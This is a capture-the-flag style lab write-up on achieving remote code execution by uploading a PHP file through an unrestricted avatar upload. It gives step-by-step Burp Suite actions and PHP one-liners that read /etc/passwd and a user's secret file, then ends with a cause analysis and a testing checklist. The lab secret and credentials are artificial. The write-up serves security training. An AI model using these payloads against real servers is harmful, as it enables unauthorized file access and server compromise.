# Lab: Remote Code Execution via Web Shell Upload

## Objective:
Exploit the vulnerable file upload functionality to upload a PHP web shell, execute code on the server, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I uploaded a normal image as my avatar and intercepted the upload request in Burp Suite.

3. I also intercepted the request used to retrieve the uploaded image:

GET /files/avatars/images.webp

4. I modified the upload request by changing the uploaded filename from:

images.webp

to

myexploit.php

5. I removed the original image contents and replaced them with a simple PHP payload:

<?php echo file_get_contents('/etc/passwd'); ?>

6. I uploaded the modified file.

7. I changed the image request to:

GET /files/avatars/myexploit.php

8. When I opened the file in the browser, the server executed the PHP code instead of downloading it, displaying the contents of:

/etc/passwd

This confirmed that Remote Code Execution (RCE) was possible.

9. I modified the payload to read the target file required by the lab:

<?php echo file_get_contents('/home/carlos/secret'); ?>

10. I uploaded the PHP file again.

11. I visited:

GET /files/avatars/myexploit.php

12. The application executed the PHP code and returned Carlos's secret:

jQXRiYNfLEJMuzronJAozr62ebwzQaBv

13. I copied the secret and submitted it.

The lab was successfully solved.

--- 

## Vulnerability:
Remote Code Execution (RCE) via Unrestricted File Upload

## Cause:
The application accepted uploaded files without validating their extension, MIME type, or contents. The uploaded file was stored inside a web-accessible directory where the web server executed PHP files, allowing arbitrary server-side code execution.

## Takeaway:
Always test file upload functionality for:

- File extension validation
- MIME type validation
- Magic byte validation
- File storage location
- Whether uploaded files are executed or downloaded
- Direct access to uploaded files

If an uploaded file can be executed by the web server, an attacker may achieve Remote Code Execution, allowing them to read files, execute commands, or fully compromise the server depending on the available PHP functions.
